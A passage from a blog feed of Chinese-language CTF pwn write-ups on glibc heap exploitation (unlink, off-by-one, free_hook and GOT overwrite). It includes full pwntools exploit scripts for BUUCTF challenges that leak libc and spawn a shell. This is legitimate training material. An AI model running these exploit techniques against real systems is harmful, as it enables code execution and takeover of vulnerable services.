class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pe=<span class="string">&#x27;./gyctf_2020_document&#x27;</span></span><br><span class="line">libc_23=<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">libc_27=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line">ip,port = <span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26272</span></span><br><span class="line">elf=ELF(pe)</span><br><span class="line">libc=ELF(libc_23)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(pe)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span>():</span>  <span class="comment">#one_gadget</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">&#x27;64&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">&#x27;2.23&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">&#x27;2.27&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span>, <span class="number">0x4f3c2</span>, <span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,sex,context</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Give me your choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;input name&#x27;</span>,<span class="built_in">str</span>(name))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;input sex&#x27;</span>,<span class="built_in">str</span>(sex))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;input information&#x27;</span>,<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Give me your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Give me your index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.recv()</span><br><span class="line">    data=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3a4428</span></span><br><span class="line">    success(<span class="string">&#x27;data : &#x27;</span> + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,sex,context</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Give me your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Give me your index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Are you sure change sex?&#x27;</span>,<span class="built_in">str</span>(sex))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Now change information&#x27;</span>,<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Give me your choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>) </span><br><span class="line">    p.sendafter(<span class="string">&#x27;Give me your index :&#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    add(<span class="string">&#x27;aaaaaaaa&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">112</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="string">&#x27;bbbbbbbb&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">112</span>)<span class="comment">#1</span></span><br><span class="line">    remove(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#show</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Give me your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Give me your index :&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    libc_start_main_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3a4428</span></span><br><span class="line">    success(<span class="string">&#x27;libc_start_main_addr : &#x27;</span> + <span class="built_in">hex</span>(libc_start_main_addr))</span><br><span class="line">    print(<span class="built_in">type</span>(data))</span><br><span class="line">    <span class="comment">#libc</span></span><br><span class="line">    bin_sh_libc=<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">    system_libc=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    libc_start_main_libc=libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    free_hook=libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    offset=libc_start_main_addr-libc_start_main_libc</span><br><span class="line">    free_hook_addr=free_hook+offset</span><br><span class="line">    system_addr=system_libc+offset</span><br><span class="line">    bin_addr=bin_sh_libc+offset</span><br><span class="line">    success(<span class="string">&#x27;free_hook: &#x27;</span> + <span class="built_in">hex</span>(free_hook_addr))</span><br><span class="line">    success(<span class="string">&quot;system: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">    success(<span class="string">&quot;bin_addr: &quot;</span> + <span class="built_in">hex</span>(bin_addr))</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    add(<span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;\x11&#x27;</span>*<span class="number">112</span>)<span class="comment">#2</span></span><br><span class="line">    remove(<span class="number">1</span>)</span><br><span class="line">    add(<span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;\x22&#x27;</span>*<span class="number">112</span>)<span class="comment">#3</span></span><br><span class="line">    payload=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(free_hook_addr-<span class="number">0x10</span>)+p64(<span class="number">0x1</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;Y&#x27;</span>,payload)</span><br><span class="line">    edit(<span class="number">3</span>,<span class="string">&#x27;Y&#x27;</span>,p64(system_addr)+p64(<span class="number">0</span>)*<span class="number">13</span>)</span><br><span class="line">    remove(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="堆" scheme="http://example.com/categories/%E5%A0%86/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>堆复习2-off-by-one加unlink</title>
    <link href="http://example.com/2021/01/23/%E5%A0%86%E5%A4%8D%E4%B9%A02-off-by-one%E5%8A%A0unlink/"/>
    <id>http://example.com/2021/01/23/%E5%A0%86%E5%A4%8D%E4%B9%A02-off-by-one%E5%8A%A0unlink/</id>
    <published>2021-01-23T14:16:39.000Z</published>
    <updated>2021-01-23T14:25:42.810Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h1 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h1><p>主要还是要熟悉unlink的利用，在最后我放上了how2heap的unlink学习及程序调试流程</p><ul><li>首先利用格式化字符串泄露 libc 和程序基址。</li><li>运用 unlink ，将 chunk 0 的地址覆写为 free_hook 的地址。</li><li>将system 地址写入 free_hook。</li><li>触发写入了 ‘/bin/sh’ 的块的删除，执行 system(‘/bin/sh’)。</li></ul><h1 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pe=<span class="string">&#x27;./axb_2019_heap&#x27;</span></span><br><span class="line">libc_23=<span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line">libc_27=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line">ip,port = <span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27128</span></span><br><span class="line">elf=ELF(pe)</span><br><span class="line">libc=ELF(libc_23)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(pe)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span>():</span>  <span class="comment">#one_gadget</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">&#x27;64&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">&#x27;2.23&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">&#x27;2.27&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span>, <span class="number">0x4f3c2</span>, <span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;):&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content: \n&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%11$p%15$p&#x27;</span>)   <span class="comment">#泄露程序的程序中的某一地址（根据偏移索引到程序起始地址）和libc地址</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x1186</span>  <span class="comment">#程序起始地址</span></span><br><span class="line">libcbase=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">240</span> <span class="comment"># libc基址</span></span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]   <span class="comment">#利用free_hook劫持</span></span><br><span class="line">bss=base+<span class="number">0x202060</span></span><br><span class="line">success(<span class="string">&#x27;base:&#x27;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line">success(<span class="string">&#x27;bss:&#x27;</span> + <span class="built_in">hex</span>(bss))</span><br><span class="line">success(<span class="string">&#x27;free_hook:&#x27;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x98</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#3  0x0068732f6e69622f</span></span><br><span class="line"> </span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#↓利用unlink伪造堆块</span></span><br><span class="line">    <span class="comment">#fd为bss上的note数组地址-0x18,bk位bss上note数组地址－0x10，并修改下一个chunk的presize和size</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x90</span>)+<span class="string">&#x27;\xa0&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#释放chunk[1]，此时通过unlink欺骗chunk[0]中存储地址为数组地址-0x18</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_hook)+p64(<span class="number">0x10</span>))   <span class="comment">#在伪堆块中放入free_hook堆块用于劫持</span></span><br><span class="line">edit(<span class="number">0</span>,p64(system))  <span class="comment">#将free地址修改为system，当执行free的时候即执行system</span></span><br><span class="line">delete(<span class="number">3</span>)  <span class="comment"># system(/bin/sh\x00)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="unlink机制"><a href="#unlink机制" class="headerlink" title="unlink机制"></a>unlink机制</h1><p><a href="https://app.yinxiang.com/fx/8a26735a-770e-457f-8d81-8c7db3e6d71c">https://app.yinxiang.com/fx/8a26735a-770e-457f-8d81-8c7db3e6d71c</a></p><h1 id="how2heap——unsafe-unlink"><a href="#how2heap——unsafe-unlink" class="headerlink" title="how2heap——unsafe_unlink"></a>how2heap——unsafe_unlink</h1><p><a href="https://app.yinxiang.com/fx/610b7515-6f92-4d97-8b91-652a83b46acb">https://app.yinxiang.com/fx/610b7515-6f92-4d97-8b91-652a83b46acb</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="堆" scheme="http://example.com/categories/%E5%A0%86/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>堆复习之off_by_one和unlink</title>
    <link href="http://example.com/2021/01/22/%E5%A0%86%E5%A4%8D%E4%B9%A0%E4%B9%8Boff-by-one%E5%92%8Cunlink/"/>
    <id>http://example.com/2021/01/22/%E5%A0%86%E5%A4%8D%E4%B9%A0%E4%B9%8Boff-by-one%E5%92%8Cunlink/</id>
    <published>2021-01-22T14:45:11.000Z</published>
    <updated>2021-01-22T14:47:48.270Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="buuctf——bamboobox（unlink）"><a href="#buuctf——bamboobox（unlink）" class="headerlink" title="buuctf——bamboobox（unlink）"></a>buuctf——bamboobox（unlink）</h1><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>伪造一个空闲 chunk。</li><li>通过 unlink 把 chunk 移到存储 chunk 指针的内存处。</li><li>覆盖 chunk 0 指针为 atoi 的 got 表地址并泄露。</li><li>覆盖 atoi 的 got 表为 system 函数地址。</li><li>给出参数 ‘sh’，调用 atoi 函数拿 shell。</li></ul><h1 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    r = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25306</span>)</span><br><span class="line">    elf=ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&#x27;/home/duxiansheng/pwn/libc/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">    elf=ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">length,name</span>):</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(name)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,length,name</span>):</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(name)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">idx</span>):</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span> * <span class="number">8</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span> * <span class="number">8</span>) <span class="comment">#2</span></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">ptr = <span class="number">0x6020c8</span></span><br><span class="line"> </span><br><span class="line">fake_chunk = p64(<span class="number">0</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x41</span>)</span><br><span class="line">fake_chunk += p64(ptr-<span class="number">0x18</span>)</span><br><span class="line">fake_chunk += p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">fake_chunk += <span class="string">&#x27;c&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x40</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,fake_chunk)</span><br><span class="line"><span class="comment">#首先在 chunk 0 构造一个 fake chunk ，并把指针分别置为 ptr-0x18 和 ptr-0x10 ，同时把 chunk 1 的 prev_size 给上 fak chunk 的大小，把 size 的 inuse 位置 0 ，这样在 free chunk 1 的时候，程序会误以为 fake chunk 为空闲的，从而触发 unlink 操作，将 ptr 指针置为 ptr - 0x18。</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"> </span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(<span class="number">0x602068</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"><span class="comment">#free 掉chunk 1 后，改写 chunk 0 的内容为 atoi 的 got 表地址。 </span></span><br><span class="line">show()</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;0 : &quot;</span>)</span><br><span class="line">atoi_addr = u64(r.recvuntil(<span class="string">&quot;:&quot;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;atoi_addr: &#x27;</span> + <span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">libcbase = atoi_addr - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span> + <span class="built_in">hex</span>(libcbase)) </span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system:&#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="comment">#泄露 atoi 函数的地址，并计算 system 函数的地址。 </span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"> </span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;sh&quot;</span>)</span><br><span class="line"><span class="comment">#将 atoi 的 got 表地址改为 system 地址，这样在主函数调用 atoi 函数时输入 sh ，就相当于执行 system(&#x27;sh&#x27;) 可以成功拿 shell 。</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="npuctf-2020-easyheap（off-by-one）"><a href="#npuctf-2020-easyheap（off-by-one）" class="headerlink" title="npuctf_2020_easyheap（off_by_one）"></a>npuctf_2020_easyheap（off_by_one）</h1><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><ol><li>通过 off by one 漏洞，修改下一个 chunk 的 size 为 0x41 大小，这样 free 之后就能造成堆块重叠。</li><li>通过堆块重叠，修改记录 size 与 chunk_addr 的 chunk 中的 chunk_addr 为 free函数的 got 表地址，然后通过show打印泄露libc</li><li>获取libc后就能计算出system的地址，再次通过off-by-one修改free@got为 system 的地址，当主函数再次执行delete（chunk2）的时候，结合 “/bin/sh” 参数，实现  system(’/bin/sh’) 获取shell</li></ol><p><strong>参考：</strong></p><p><a href="https://blog.csdn.net/mcmuyanga/article/details/112851757">https://blog.csdn.net/mcmuyanga/article/details/112851757</a></p><h1 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28454</span>)</span><br><span class="line">    elf=ELF(<span class="string">&#x27;./npuctf_2020_easyheap&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&quot;./npuctf_2020_easyheap&quot;</span>)</span><br><span class="line">    elf=ELF(<span class="string">&#x27;./npuctf_2020_easyheap&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Size of Heap(0x10 or 0x20 only) : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice 